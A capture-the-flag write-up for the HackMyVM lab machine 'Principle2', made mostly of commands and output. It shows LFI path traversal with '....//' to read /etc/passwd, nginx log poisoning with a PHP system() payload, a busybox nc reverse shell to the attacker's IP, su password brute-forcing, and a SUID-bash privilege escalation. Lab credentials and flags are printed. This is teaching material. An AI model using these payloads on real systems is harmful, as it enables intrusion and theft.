# Principle 2

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.127:80
Open 10.0.2.127:111
Open 10.0.2.127:139
Open 10.0.2.127:445
Open 10.0.2.127:2049
Open 10.0.2.127:33313
Open 10.0.2.127:37801
Open 10.0.2.127:39477
Open 10.0.2.127:40929
Open 10.0.2.127:54611
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.127
PORT      STATE SERVICE     REASON  VERSION
80/tcp    open  http        syn-ack nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Apache2 Debian Default Page: It works
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40929/tcp   mountd
|   100005  1,2,3      44567/tcp6  mountd
|   100005  1,2,3      47952/udp6  mountd
|   100005  1,2,3      57685/udp   mountd
|   100021  1,3,4      35970/udp   nlockmgr
|   100021  1,3,4      37801/tcp   nlockmgr
|   100021  1,3,4      38331/tcp6  nlockmgr
|   100021  1,3,4      51972/udp6  nlockmgr
|   100024  1          33670/udp   status
|   100024  1          44639/udp6  status
|   100024  1          54611/tcp   status
|   100024  1          59675/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack Samba smbd 4
445/tcp   open  netbios-ssn syn-ack Samba smbd 4
2049/tcp  open  nfs_acl     syn-ack 3 (RPC #100227)
33313/tcp open  mountd      syn-ack 1-3 (RPC #100005)
37801/tcp open  nlockmgr    syn-ack 1-4 (RPC #100021)
39477/tcp open  mountd      syn-ack 1-3 (RPC #100005)
40929/tcp open  mountd      syn-ack 1-3 (RPC #100005)
54611/tcp open  status      syn-ack 1 (RPC #100024)

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 23722/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64962/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51338/udp): CLEAN (Failed to receive data)
|   Check 4 (port 26725/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-08T13:09:01
|_  start_date: N/A
```
:::

## SMB (Anonymous)

```bash
└─$ netexec smb 10.0.2.127 -u '' -p '' --shares
SMB         10.0.2.127      445    PRINCIPLE2       [*] Unix - Samba (name:PRINCIPLE2) (domain:PRINCIPLE2) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.127      445    PRINCIPLE2       [+] PRINCIPLE2\:
SMB         10.0.2.127      445    PRINCIPLE2       [*] Enumerated shares
SMB         10.0.2.127      445    PRINCIPLE2       Share           Permissions     Remark
SMB         10.0.2.127      445    PRINCIPLE2       -----           -----------     ------
SMB         10.0.2.127      445    PRINCIPLE2       public          READ            New Jerusalem Public
SMB         10.0.2.127      445    PRINCIPLE2       hermanubis                      Hermanubis share
SMB         10.0.2.127      445    PRINCIPLE2       IPC$                            IPC Service (Samba 4.17.12-Debian)
```

```bash
└─$ impacket-smbclient ''/'':''@10.0.2.127
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# use public
# ls
drw-rw-rw-          0  Tue Nov 28 06:57:45 2023 .
drw-rw-rw-          0  Sat Nov 25 11:19:40 2023 ..
-rw-rw-rw-        158  Sun Nov 19 07:00:59 2023 new_era.txt
-rw-rw-rw-        718  Sun Nov 19 07:00:24 2023 straton.txt
-rw-rw-rw-        931  Sun Nov 19 07:01:07 2023 loyalty.txt
# cat new_era.txt
Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.

# cat straton.txt
This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.

AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds
 it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the un
iverse is similar in nature? And if so, what follows from that fact?

# cat loyalty.txt
This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).

What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As
 I have argued, this is not a matter of arrogance, but of responsibility.

2257686f2061726520796f752c207468656e3f22

To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and si
gnificant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against
 those who preach the gospel of self-annihilation. We ignore it at our peril.
```

```bash
└─$ echo 2257686f2061726520796f752c207468656e3f22 | xxd -r -p
"Who are you, then?" 
```

## NFS

```bash
└─$ showmount -e 10.0.2.127
Export list for 10.0.2.127:
/var/backups *
/home/byron  *
```

Mount
```bash
└─$ sudo mount 10.0.2.127:/home/byron /mnt/tmpmount

└─# cat mayor.txt
Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.

└─# cat memory.txt
Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.

└─$ sudo umount /mnt/tmpmount
```

No access to backups
```bash
└─$ sudo mount 10.0.2.127:/var/backups /mnt/tmpmount

└─# cd tmpmount
cd: permission denied: tmpmount
```

NFS has a "weakness" where if you have the same UID you can essentially become that user.
```bash
└─# ls -ld tmpmount
Permissions Size User Date Modified Name
drwxr--r--@    - 54   28 Nov  2023   tmpmount
```

```bash
└─$ sudo useradd -u 54 -M -s /usr/bin/bash -p "$(openssl passwd -6 x)" principle
└─$ su principle
Password: x
principle@kraken:/home/woyag/Desktop/Rooms/HackMyVM/Principle2$ id
uid=54(principle) gid=1003(principle) groups=1003(principle)

principle@kraken:/mnt/tmpmount$ cat 7.txt | xxd -r -p ;echo
wRk8&*f*
principle@kraken:/mnt/tmpmount$ cat 452.txt | xxd -r -p ;echo
ByronIsAsshole
```

Just in case decode any other files 
```python
from pathlib import Path

for file in Path('.').glob('*.txt'):
    with open(file) as f:
        content = bytes.fromhex(f.read())
        
    if content.isascii():
        print(file, content.decode())
```

Only 452 is valid.

## SMB (hermanubis)

```bash
└─$ netexec smb 10.0.2.127 -u 'hermanubis' -p 'ByronIsAsshole' --shares
SMB         10.0.2.127      445    PRINCIPLE2       [*] Unix - Samba (name:PRINCIPLE2) (domain:PRINCIPLE2) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.127      445    PRINCIPLE2       [+] PRINCIPLE2\hermanubis:ByronIsAsshole
SMB         10.0.2.127      445    PRINCIPLE2       [*] Enumerated shares
SMB         10.0.2.127      445    PRINCIPLE2       Share           Permissions     Remark
SMB         10.0.2.127      445    PRINCIPLE2       -----           -----------     ------
SMB         10.0.2.127      445    PRINCIPLE2       public          READ            New Jerusalem Public
SMB         10.0.2.127      445    PRINCIPLE2       hermanubis      READ            Hermanubis share
SMB         10.0.2.127      445    PRINCIPLE2       IPC$                            IPC Service (Samba 4.17.12-Debian)
```

```bash
└─$ impacket-smbclient ''/'hermanubis':'ByronIsAsshole'@10.0.2.127
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# use hermanubis
# ls
drw-rw-rw-          0  Tue Nov 28 09:44:44 2023 .
drw-rw-rw-          0  Tue Nov 28 20:13:50 2023 ..
-rw-rw-rw-        346  Tue Nov 28 09:44:41 2023 index.html
-rw-rw-rw-     307344  Tue Nov 28 12:23:23 2023 prometheus.jpg
# cat index.html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to the resistance forum</title>
</head>
<body>
    <h1>Welcome to the resistance forum</h1>
    <p>free our chains!</p>
    <img src="prometheus.jpg" alt="chained">
</body>
</html>

# get prometheus.jpg
# exit
```

```bash
└─$ stegseek prometheus.jpg $rockyou
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "soldierofanubis"
[i] Original filename: "secret.txt".
[i] Extracting to "prometheus.jpg.out".
```

```bash
└─$ cat prometheus.jpg.out
I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
```

## HTTP (+Hostname)

```bash
└─$ curl http://thetruthoftalos.hmv/ -i
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Mon, 08 Dec 2025 13:42:26 GMT
Content-Type: text/html
Content-Length: 8
Last-Modified: Wed, 22 Nov 2023 10:44:39 GMT
Connection: keep-alive
ETag: "655ddb97-8"
Accept-Ranges: bytes

NOTHING
```

```bash
└─$ feroxbuster -u http://thetruthoftalos.hmv/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET        1l        1w        8c http://thetruthoftalos.hmv/
200      GET        1l        1w        8c http://thetruthoftalos.hmv/index.html
200      GET       82l      151w     1970c http://thetruthoftalos.hmv/index.php
301      GET        7l       11w      169c http://thetruthoftalos.hmv/uploads => http://thetruthoftalos.hmv/uploads/
```

![writeup.png](/assets/pentest/hackmyvm/principle2/writeup.png)

Nothing from files
```bash
curl 'http://thetruthoftalos.hmv/index.php?filename=zeus.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=hera.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=poseidon.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=demeter.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=athena.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=apollo.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=artemis.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=ares.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=aphrodite.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=hephaestus.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=hermes.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=dionysus.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=hestia.txt' -s | htmlq -t pre
curl 'http://thetruthoftalos.hmv/index.php?filename=hades.txt' -s | htmlq -t pre
```

### LFI

LFI fuzzing show that there's a simple WAF on endpoint to prevent path traversal.
```bash
└─$ ffuf -u 'http://thetruthoftalos.hmv/index.php?filename=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr 'Content of' -fr '<pre></pre>'
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3395, Words: 689, Lines: 111, Duration: 8ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3416, Words: 689, Lines: 111, Duration: 9ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3380, Words: 689, Lines: 111, Duration: 17ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3413, Words: 689, Lines: 111, Duration: 10ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3386, Words: 689, Lines: 111, Duration: 15ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3383, Words: 689, Lines: 111, Duration: 16ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3392, Words: 689, Lines: 111, Duration: 11ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3374, Words: 689, Lines: 111, Duration: 28ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3404, Words: 689, Lines: 111, Duration: 7ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3407, Words: 689, Lines: 111, Duration: 13ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3377, Words: 689, Lines: 111, Duration: 29ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3371, Words: 689, Lines: 111, Duration: 28ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3368, Words: 689, Lines: 111, Duration: 28ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3389, Words: 689, Lines: 111, Duration: 14ms]
....//....//....//....//etc/passwd [Status: 200, Size: 3362, Words: 689, Lines: 111, Duration: 27ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3410, Words: 689, Lines: 111, Duration: 20ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3401, Words: 689, Lines: 111, Duration: 10ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 3365, Words: 689, Lines: 111, Duration: 28ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 3398, Words: 689, Lines: 111, Duration: 11ms]
:: Progress: [929/929] :: Job [1/1] :: 1015 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

```bash
└─$ curl 'http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//etc/passwd' -s | htmlq -t pre | grep sh$
root:x:0:0:root:/root:/bin/bash
talos:x:1000:1000:Talos,,,:/home/talos:/bin/bash
byron:x:1001:1001::/home/byron:/bin/sh
hermanubis:x:1002:1002::/home/hermanubis:/bin/sh
melville:x:1003:1003::/home/melville:/bin/bash
```

### RCE

We can read log files meaning we can poison it to get code execution via `include`
```bash
└─$ curl 'http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//var/log/nginx/access.log' -s | htmlq -t pre | tail
10.0.2.15 - - [08/Dec/2025:13:52:12 +0000] "GET /?filename=....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1" 200 8 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:52:18 +0000] "GET /index.php?filename=....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1" 200 3386 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:52:22 +0000] "GET /index.php?filename=....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1" 200 3386 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:52:25 +0000] "GET /index.php?filename=....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1" 200 3386 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:53:48 +0000] "GET /index.php?filename=....//....//....//....//....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 1999793 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:53:52 +0000] "GET /index.php?filename=....//....//....//....//....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 1998452 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:54:04 +0000] "GET /index.php?filename=....//....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 1999947 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:54:10 +0000] "GET /index.php?filename=....//....//....//....//var/log/nginx/access.log HTTP/1.1" 200 1999693 "-" "curl/8.15.0"
10.0.2.15 - - [08/Dec/2025:13:54:15 +0000] "GET /index.php?filename=....//....//....//var/log/nginx/access.log HTTP/1.1" 200 2015 "-" "curl/8.15.0"
```

Poison
```bash
└─$ curl 'http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//var/log/nginx/access.log&0=id' -A 'START<?php system($_REQUEST[0]); ?>END' -s | htmlq -t pre | tail
```

```bash
└─$ curl 'http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//var/log/nginx/access.log&0=id' -s | htmlq -t pre | grep -oP 'START\K.*'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl 'http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//var/log/nginx/access.log' -s -G --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@principle2:~/thetruthoftalos.hmv$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (hermanubis)

```bash
www-data@principle2:/opt$ sudo -l
Matching Defaults entries for www-data on principle2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on principle2:
    (talos) NOPASSWD: /usr/bin/cat
```

```bash
www-data@principle2:/opt$ find / -user talos -ls 2>/dev/null
   261485      4 drwxr-xr-x   3 talos    talos        4096 Nov 25  2023 /home/talos
   261487      4 -rw-r--r--   1 talos    talos         807 Nov 18  2023 /home/talos/.profile
   261488      4 -rw-r--r--   1 talos    talos        3526 Nov 18  2023 /home/talos/.bashrc
   261126      4 drwxr-xr-x   3 talos    talos        4096 Nov 18  2023 /home/talos/.local
   261127      4 drwx------   3 talos    talos        4096 Nov 18  2023 /home/talos/.local/share
   261489      4 -rw-r--r--   1 talos    talos         220 Nov 18  2023 /home/talos/.bash_logout

www-data@principle2:/opt$ find / -group talos -ls 2>/dev/null
       24      4 -rw-r-----   1 root     talos           1 Nov 29  2023 /opt/users.txt
   261485      4 drwxr-xr-x   3 talos    talos        4096 Nov 25  2023 /home/talos
   261487      4 -rw-r--r--   1 talos    talos         807 Nov 18  2023 /home/talos/.profile
   261488      4 -rw-r--r--   1 talos    talos        3526 Nov 18  2023 /home/talos/.bashrc
   261126      4 drwxr-xr-x   3 talos    talos        4096 Nov 18  2023 /home/talos/.local
   261127      4 drwx------   3 talos    talos        4096 Nov 18  2023 /home/talos/.local/share
   261489      4 -rw-r--r--   1 talos    talos         220 Nov 18  2023 /home/talos/.bash_logout
   686308     20 -rwxrwx---   1 root     talos       16584 Nov 25  2023 /usr/local/share/report

www-data@principle2:/opt$ sudo -u talos cat /opt/users.txt
# Empty
```

`report` binary seems to be related, we can't execute it. Download it so we can inspect it.
```bash
www-data@principle2:/opt$ sudo -u talos cat /usr/local/share/report > /tmp/report
www-data@principle2:/tmp$ python3 -m http.server
└─$ curl http://10.0.2.127:8000/report -Os
```

- [https://dogbolt.org/?id=1e2bf9a1-c345-45fb-bfd1-95bac3e9ed61](https://dogbolt.org/?id=1e2bf9a1-c345-45fb-bfd1-95bac3e9ed61)

![writeup-1.png](/assets/pentest/hackmyvm/principle2/writeup-1.png)

Hmmm.... nothing exploitable stands out.

We can actually become `hermanubis`
```bash
www-data@principle2:/tmp$ echo ByronIsAsshole | su - hermanubis -c id
Password: uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis)
```

```bash
www-data@principle2:/tmp$ su - hermanubis
Password:
$ id
uid=1002(hermanubis) gid=1002(hermanubis) groups=1002(hermanubis)
```

### User.txt

```bash
hermanubis@principle2:~$ cat user.txt
                                ...',;;:cccccccc:;,..
                            ..,;:cccc::::ccccclloooolc;'.
                         .',;:::;;;;:loodxk0kkxxkxxdocccc;;'..
                       .,;;;,,;:coxldKNWWWMMMMWNNWWNNKkdolcccc:,.
                    .',;;,',;lxo:...dXWMMMMMMMMNkloOXNNNX0koc:coo;.
                 ..,;:;,,,:ldl'   .kWMMMWXXNWMMMMXd..':d0XWWN0d:;lkd,
               ..,;;,,'':loc.     lKMMMNl. .c0KNWNK:  ..';lx00X0l,cxo,.
             ..''....'cooc.       c0NMMX;   .l0XWN0;       ,ddx00occl:.
           ..'..  .':odc.         .x0KKKkolcld000xc.       .cxxxkkdl:,..
         ..''..   ;dxolc;'         .lxx000kkxx00kc.      .;looolllol:'..
        ..'..    .':lloolc:,..       'lxkkkkk0kd,   ..':clc:::;,,;:;,'..
        ......   ....',;;;:ccc::;;,''',:loddol:,,;:clllolc:;;,'........
            .     ....'''',,,;;:cccccclllloooollllccc:c:::;,'..
                    .......'',,,,,,,,;;::::ccccc::::;;;,,''...
                      ...............''',,,;;;,,''''''......
                           ............................

CONGRATULATIONS!

The flag is:
&5Wvtd!84S6JSMeH
```

## Privilege Escalation

```bash
hermanubis@principle2:~$ cat investigation.txt
I am aware that Byron hates me... especially since I lost my password.
My friends along with myself after several analyses and attacks, we have detected that Melville is using a 32 character password....
What he doesn't know is that it is in the Byron database...
```

```bash
hermanubis@principle2:~$ sudo -l
Matching Defaults entries for hermanubis on principle2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User hermanubis may run the following commands on principle2:
    (talos) NOPASSWD: /usr/bin/cat
```

Get passwords
```bash
principle@kraken:/$ cat /mnt/tmpmount/*.txt > /tmp/passwords.txt
```

Upload su brute forcer
```bash
hermanubis@principle2:/tmp$ curl -LOs https://raw.githubusercontent.com/carlospolop/su-bruteforce/refs/heads/master/suBF.sh
hermanubis@principle2:/tmp$ nc -lnvp 4444 > /tmp/passwords.txt
---
└─$ nc 10.0.2.127 4444 -w 1 < /tmp/passwords.txt
---
hermanubis@principle2:/tmp$ chmod +x /tmp/suBF.sh
hermanubis@principle2:/tmp$ /tmp/suBF.sh -u melville -w /tmp/passwords.txt -t 1 -s 0.05
  [+] Bruteforcing melville...
  You can login as melville using password: 1bd5528b6def9812acba8eb21562c3ec
```

::: info Creds
`melville:1bd5528b6def9812acba8eb21562c3ec`
:::

## Privilege Escalation (root)

```bash
melville@principle2:~$ id
uid=1003(melville) gid=1003(melville) groups=1003(melville),1000(talos)
melville@principle2:~$ sudo -l
Matching Defaults entries for melville on principle2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User melville may run the following commands on principle2:
    (talos) NOPASSWD: /usr/bin/cat
```

We are part of `talos` ground and can edit the `report` binary

```bash
melville@principle2:~$ cp /usr/local/share/report /tmp/report.bak
melville@principle2:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /usr/local/share/report
```

```bash
melville@principle2:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1003(melville) gid=1003(melville) euid=0(root) groups=1003(melville),1000(talos)
```

### Root.txt

```bash
rootbash-5.2# cat /root/root.txt
⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
